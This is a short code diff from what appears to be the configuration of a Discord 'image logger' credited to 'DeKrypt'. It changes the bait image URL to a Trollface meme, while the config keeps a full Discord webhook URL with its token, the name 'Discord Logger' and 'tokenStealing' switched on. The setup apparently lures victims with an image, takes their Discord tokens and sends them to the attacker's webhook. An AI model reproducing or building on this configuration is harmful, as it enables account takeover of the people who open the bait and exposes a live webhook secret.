@@ -10,7 +10,7 @@ __author__ = "DeKrypt"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1487734707847172167/a0c6N1lRRQiAnem-7t00vA8X7abG7ghfAJZ33Vvyk3yURpgK8j9nvZwgxe35k0sUTneY",
-    "image": "https://www.bing.com/ck/a?!&&p=0dc49b6a069fb3ab8f44539b2d3d5dec35ae727ea9c441cf7ac8ff6723843ae7JmltdHM9MTc3NDc0MjQwMA&ptn=3&ver=2&hsh=4&fclid=07db7196-28bd-6773-273c-668929cf662a&u=a1L2ltYWdlcy9zZWFyY2g_cT1pbWFnZS5wbmcmaWQ9RDdFNTNFOTU2NzFGODhGQzcxNjM3NjYzQzAyNDJGQTAxNDMyNUUwNiZGT1JNPUlBQ0ZJUg&ntb=1",
+    "image": "https://duckduckgo.com/?q=meme+png&ia=images&iax=images&iai=https%3A%2F%2Fwww.pngmart.com%2Ffiles%2F11%2FTrollface-Meme-PNG-Picture.png",
     "username": "Discord Logger",
     "color": 0x5865F2,
     "tokenStealing": True,
